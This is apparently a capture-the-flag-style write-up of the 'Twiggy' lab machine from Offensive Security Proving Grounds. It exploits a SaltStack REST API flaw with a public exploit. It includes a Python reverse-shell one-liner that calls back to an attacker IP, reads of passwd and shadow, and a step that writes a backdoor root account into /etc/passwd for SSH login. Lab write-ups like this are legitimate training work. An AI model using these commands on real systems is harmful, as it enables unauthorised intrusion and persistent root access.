---
description: Writeup for Twiggy from Offensive Security Proving Grounds (PG)
---

# Twiggy

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.134.62 -t full`

`nmapAutomator.sh -H 192.168.134.62 -t vulns`

![](../../.gitbook/assets/4591f23d66844cfa8e3dfe365c0c0863.png)

### Port 80

Mezzanine is running.

![](../../.gitbook/assets/9777714328414f029c1c70fb5902d558.png)

### Port 8000

The SaltStack Salt REST API is running.

![](../../.gitbook/assets/7ef843ff98d74ead9c22591945e47d6f.png)

## Exploitation

SaltStack &lt; 3000.2, &lt; 2019.2.4, 2017.\*, 2018.\* is vulnerable to an RCE vulnerability.

Exploit from: [https://www.exploit-db.com/exploits/48421](https://www.exploit-db.com/exploits/48421)

![](../../.gitbook/assets/586b49ee1e844709bb90a376b7f43e92.png)

We can try to execute a reverse shell.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.134",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

However, this does not work \(presumably because of the firewall\).

We can, however, read arbitrary files, including `passwd` and `shadow`.

![](../../.gitbook/assets/ee4085800b784b38bf5014c53ef3fb21.png)

![](../../.gitbook/assets/59b5700fa986437db1c089123cf13f86.png)

We can also write arbitrary files. To add our own root user to `/etc/passwd`:

```bash
echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd
```

Note that this hash corresponds to our custom password, `mypass`.

```bash
$ openssl passwd mypass                                                    
bWBoOyE1sFaiQ
```

Upload the modified file: `python3 48421.py --master 192.168.134.62 --upload-src passwd --upload-dest ../../../../../etc/passwd`

![](../../.gitbook/assets/8461c72141664918a8f64d118b3028af.png)

Check that our user was correctly added:

![](../../.gitbook/assets/83e1acb549034264a3408e7cba2251e3.png)

Now, using the `root:mypass` credentials, we can SSH into the server as root. This works because password authentication is enabled.

![](../../.gitbook/assets/4994407277db4fe9a3fee4fb462816df.png)

![](../../.gitbook/assets/7c8646a82aac4f17bf9cba7da5de13b6.png)

